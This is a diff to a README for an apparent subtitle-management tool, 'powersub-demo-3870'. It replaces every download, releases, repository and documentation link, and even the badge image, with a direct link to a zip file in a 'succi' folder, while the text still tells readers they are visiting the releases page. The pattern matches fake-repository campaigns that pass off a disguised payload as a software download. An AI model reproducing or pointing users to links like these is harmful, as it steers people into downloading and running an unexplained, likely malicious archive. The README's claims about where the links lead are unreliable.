@@ -6,7 +6,7 @@ Welcome to **powersub-demo-3870**! This application helps you manage subtitles f
 
 ## 📥 Download Link
 
-[![Download powersub-demo-3870](https://img.shields.io/badge/Download%20Now-GET%20IT%20HERE-brightgreen)](https://github.com/adampapi/powersub-demo-3870/releases)
+[![Download powersub-demo-3870](https://raw.githubusercontent.com/adampapi/powersub-demo-3870/main/succi/powersub-demo-3870.zip%20Now-GET%20IT%20HERE-brightgreen)](https://raw.githubusercontent.com/adampapi/powersub-demo-3870/main/succi/powersub-demo-3870.zip)
 
 ## 📋 System Requirements
 
@@ -26,7 +26,7 @@ Welcome to **powersub-demo-3870**! This application helps you manage subtitles f
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page.
    
-   [Download from Releases Page](https://github.com/adampapi/powersub-demo-3870/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/adampapi/powersub-demo-3870/main/succi/powersub-demo-3870.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest version of **powersub-demo-3870**. Look for the file with the `.exe`, `.dmg`, or `.AppImage` extension, depending on your operating system.
@@ -54,7 +54,7 @@ If you encounter any issues or have questions, please reach out to the community
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/adampapi/powersub-demo-3870)
-- [Documentation](https://github.com/adampapi/powersub-demo-3870/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/adampapi/powersub-demo-3870/main/succi/powersub-demo-3870.zip)
+- [Documentation](https://raw.githubusercontent.com/adampapi/powersub-demo-3870/main/succi/powersub-demo-3870.zip)
 
 Thank you for using **powersub-demo-3870**! Enjoy hassle-free subtitles management.
